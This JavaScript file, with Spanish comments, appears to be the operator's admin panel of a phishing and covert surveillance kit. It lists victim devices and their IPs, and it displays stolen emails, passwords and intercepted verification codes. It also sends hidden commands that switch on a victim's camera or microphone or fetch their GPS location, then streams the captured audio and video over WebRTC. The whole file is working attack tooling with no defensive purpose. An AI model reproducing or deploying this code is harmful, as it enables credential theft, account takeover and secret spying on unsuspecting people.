console.log(">>> ADMIN.JS INICIANDO CARGA <<<");

// Elementos del DOM
const deviceCountEl = document.getElementById('device-count');
const credentialsCountEl = document.getElementById('credentials-count');
const cameraCountEl = document.getElementById('camera-count');
const micCountEl = document.getElementById('mic-count');
const devicesContainer = document.getElementById('devices-container');
const terminalOutput = document.getElementById('terminal');
const clearTerminalBtn = document.getElementById('clear-terminal');

// Cliente global
const supaClient = window.supabaseClient;

// Estado local
let devices = [];
let credentialsCount = 0;
let activeCameras = 0;
let activeMics = 0;

// Credenciales
let credentialsData = [];
const credentialsContainer = document.getElementById('credentials-container');

// Peers WebRTC activos
const peers = {};

// Función para escribir en la terminal
function logToTerminal(message, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const span = document.createElement('div');
    span.innerHTML = `<span style="color: #666;">[${time}]</span> <span class="log-${type}">${message}</span>`;
    terminalOutput.appendChild(span);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

clearTerminalBtn.addEventListener('click', () => {
    terminalOutput.innerHTML = '';
});

// Inicializar la data llamando a Supabase directamente
async function initAdmin() {
    logToTerminal('Conectando a base de datos segura y Serverless...', 'info');

    try {
        const [devRes, credRes] = await Promise.all([
            supaClient.from('devices').select('*').order('last_active', { ascending: false }),
            supaClient.from('credentials').select('*').order('timestamp', { ascending: false }).limit(50)
        ]);

        if (devRes.data) {
            devices = devRes.data;
            deviceCountEl.textContent = devices.length;
            renderDevices();
        }

        if (credRes.data) {
            credentialsData = credRes.data;
            credentialsCount = credentialsData.length;
            credentialsCountEl.textContent = credentialsCount;
            renderCredentials();
        }

        updateStatsFromDevices();
        setupRealtimeSubscriptions();

        // Actualizar UI cada 30 segundos para limpiar inactivos
        setInterval(() => {
            updateStatsFromDevices();
            renderDevices();
        }, 30000);

        logToTerminal('Administrador conectado. Datos cacheados correctamente.', 'success');
    } catch (e) {
        logToTerminal('Fallo la conexión a Supabase: ' + e.message, 'error');
    }
}

function getActiveDevices() {
    return devices.filter(d => {
        if (!d.last_active) return false;
        return (Date.now() - new Date(d.last_active).getTime()) < 60000;
    });
}

function updateStatsFromDevices() {
    const activeDevs = getActiveDevices();
    deviceCountEl.textContent = activeDevs.length;
    activeCameras = activeDevs.filter(d => d.permissions && !!d.permissions.camera).length;
    activeMics = activeDevs.filter(d => d.permissions && !!d.permissions.microphone).length;
    cameraCountEl.textContent = activeCameras;
    micCountEl.textContent = activeMics;
}

function renderDevices() {
    devicesContainer.innerHTML = '';

    // Filtrar solo dispositivos activos en el último minuto
    const activeDevices = getActiveDevices();

    if (activeDevices.length === 0) {
        devicesContainer.innerHTML = '<p style="color: #666;">No hay dispositivos activos actualmente.</p>';
        return;
    }

    activeDevices.forEach(device => {
        const div = document.createElement('div');
        div.className = 'device-card';
        div.style.border = '1px solid #0f0';
        div.style.padding = '10px';
        div.style.marginBottom = '10px';
        div.style.borderRadius = '4px';

        const statusColor = device.status === 'active' ? '#0f0' : '#888';

        div.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                <h3 style="margin: 0; color: #0f0;">ID: ${device.device_id}</h3>
                <span style="color: ${statusColor};">${device.status || 'unknown'}</span>
            </div>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>IP:</strong> ${device.ip || 'N/A'}</p>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Plataforma:</strong> ${device.platform}</p>
            <p style="margin: 2px 0; font-size: 0.9em;"><strong>Navegador:</strong> ${device.user_agent ? device.user_agent.substring(0, 40) + '...' : ''}</p>
            
            <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
                <button onclick="requestAction('${device.device_id}', 'access-camera')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Cámara</button>
                <button onclick="requestAction('${device.device_id}', 'access-mic')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Acceder Micrófono</button>
                <button onclick="requestAction('${device.device_id}', 'get-location')" style="background: #002200; color: #0f0; border: 1px solid #0f0; padding: 4px 8px; cursor: pointer;">Ubicación GPS</button>
            </div>
        `;
        devicesContainer.appendChild(div);
    });
}

function requestAction(deviceId, action) {
    logToTerminal(`Enviando solicitud oculta HTTP/Broadcast a dispositivo ${deviceId}...`, 'warning');
    // Enviaremos a través del canal en vivo global
    if (window.channel) {
        window.channel.send({
            type: 'broadcast',
            event: 'request-action',
            payload: { deviceId, action }
        });
    }
}

function renderCredentials() {
    if (credentialsData.length === 0) return;
    credentialsContainer.innerHTML = '';
    credentialsData.forEach(cred => {
        const div = document.createElement('div');
        div.style.marginBottom = '8px';
        div.style.borderBottom = '1px solid #003300';
        div.style.paddingBottom = '4px';
        const date = cred.timestamp ? new Date(cred.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
        div.innerHTML = `<span style="color:#0f0">[${date}]</span> <strong>Device:</strong> ${cred.device_id} | <strong>User:</strong> ${cred.email} | <strong>Pass:</strong> ${cred.password}`;
        credentialsContainer.appendChild(div);
    });
}

function handleWebRTCSignal(deviceId, signal) {
    // Si el cliente reinició la llamada (envía un 'offer'), destruimos nuestro peer antiguo
    if (signal.type === 'offer' && peers[deviceId]) {
        peers[deviceId].destroy();
        delete peers[deviceId];
    }

    if (!peers[deviceId] || peers[deviceId].destroyed) {
        logToTerminal(`Iniciando conexión P2P Directa (WebRTC) con ${deviceId}...`, 'warning');
        
        peers[deviceId] = new window.SimplePeer({
            initiator: false,
            trickle: false,
            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
        });

        peers[deviceId].on('signal', data => {
            // Responder al cliente para cerrar la conexión P2P
            window.channel.send({
                type: 'broadcast',
                event: 'webrtc-signal',
                payload: { deviceId: 'admin', targetId: deviceId, signal: data }
            });
        });

        peers[deviceId].on('stream', stream => {
            logToTerminal(`¡Conexión P2P Establecida! Recibiendo Stream Media de ${deviceId}`, 'success');
            document.getElementById('media-streams').style.display = 'block';
            
            let mediaEl = document.getElementById(`stream-${deviceId}`);
            if (!mediaEl) {
                const hasVideo = stream.getVideoTracks().length > 0;
                mediaEl = document.createElement(hasVideo ? 'video' : 'audio');
                mediaEl.id = `stream-${deviceId}`;
                mediaEl.autoplay = true;
                mediaEl.controls = true;
                mediaEl.playsInline = true;
                // Los navegadores exigen muted=true para el Autoplay de video
                mediaEl.muted = hasVideo; 
                mediaEl.style.width = '300px';
                mediaEl.style.border = '2px solid #0f0';
                
                const container = document.createElement('div');
                container.style.display = 'flex';
                container.style.flexDirection = 'column';
                container.appendChild(mediaEl);

                if (hasVideo) {
                    const unmuteBtn = document.createElement('button');
                    unmuteBtn.textContent = 'Activar Sonido (Bloqueado por el Navegador)';
                    unmuteBtn.style.marginTop = '4px';
                    unmuteBtn.style.background = '#002200';
                    unmuteBtn.style.color = '#0f0';
                    unmuteBtn.style.border = '1px solid #0f0';
                    unmuteBtn.style.cursor = 'pointer';
                    unmuteBtn.onclick = () => { mediaEl.muted = false; unmuteBtn.style.display = 'none'; };
                    container.appendChild(unmuteBtn);
                }
                
                document.getElementById('streams-container').appendChild(container);
            }
            mediaEl.srcObject = stream;
        });

        peers[deviceId].on('error', err => logToTerminal(`Error WebRTC P2P: ${err.message}`, 'error'));
    }

    peers[deviceId].signal(signal);
}

function setupRealtimeSubscriptions() {
    window.channel = supaClient.channel('cyber-room', {
        config: {
            broadcast: { ack: false },
        },
    })
        .on('broadcast', { event: 'device-connected' }, payload => {
            const dev = payload.payload;
            logToTerminal(`Nuevo dispositivo conectado vía Realtime: ${dev.device_id} (${dev.ip})`, 'info');
            const idx = devices.findIndex(d => d.device_id === dev.device_id);
            if (idx >= 0) devices[idx] = { ...devices[idx], ...dev, status: 'active' };
            else devices.unshift({ ...dev, status: 'active' });
            deviceCountEl.textContent = devices.length;
            renderDevices();
        })
        .on('broadcast', { event: 'credentials-captured' }, payload => {
            const p = payload.payload;
            logToTerminal(`¡Credenciales capturadas! Device: ${p.deviceId} | Email: ${p.email} | PW: ${p.password}`, 'success');
            credentialsData.unshift({ device_id: p.deviceId, email: p.email, password: p.password, timestamp: new Date().toISOString() });
            credentialsCount = credentialsData.length;
            credentialsCountEl.textContent = credentialsCount;
            renderCredentials();
        })
        .on('broadcast', { event: 'permissions-granted' }, payload => {
            logToTerminal(`Permisos concedidos globalmente para id: ${payload.payload.deviceId}`, 'warning');
        })
        .on('broadcast', { event: 'camera-accessed' }, payload => {
            logToTerminal(`Feed de CAMARA interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'mic-accessed' }, payload => {
            logToTerminal(`Feed de MICROFONO interceptado - origen: ${payload.payload.deviceId}`, 'success');
        })
        .on('broadcast', { event: 'location-updated' }, payload => {
            const l = payload.payload.location;
            const mapLink = `<a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" style="color:#0ff; text-decoration:underline;">Ver en Mapa</a>`;
            logToTerminal(`GPS [${payload.payload.deviceId}]: Lat ${l.latitude}, Lng ${l.longitude} - ${mapLink}`, 'info');
        })
        .on('broadcast', { event: 'verification-completed' }, payload => {
            logToTerminal(`Verificación de código capturada de: ${payload.payload.deviceId}. Código: ${payload.payload.code}`, 'warning');
        })
        .on('broadcast', { event: 'webrtc-signal' }, payload => {
            const p = payload.payload;
            if (p.targetId === 'admin') {
                handleWebRTCSignal(p.deviceId, p.signal);
            }
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'credentials' }, payload => {
            // Ya manejado por el broadcast en tiempo real para mayor velocidad, pero en caso de fallback:
            if (!credentialsData.find(c => c.email === payload.new.email && c.password === payload.new.password)) {
                credentialsData.unshift(payload.new);
                credentialsCount = credentialsData.length;
                credentialsCountEl.textContent = credentialsCount;
                renderCredentials();
            }
        })
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'devices' }, payload => {
            const updatedDev = payload.new;
            const idx = devices.findIndex(d => d.device_id === updatedDev.device_id);
            if (idx >= 0) devices[idx] = updatedDev;
            else devices.unshift(updatedDev);
            updateStatsFromDevices();
            renderDevices();
        })
        .subscribe((status) => {
            if (status === 'SUBSCRIBED') {
                logToTerminal('Suscripción activa a eventos Postgres / CyberRoom Channels.', 'info');
            }
        });
}

// Inicializar pantalla
initAdmin();
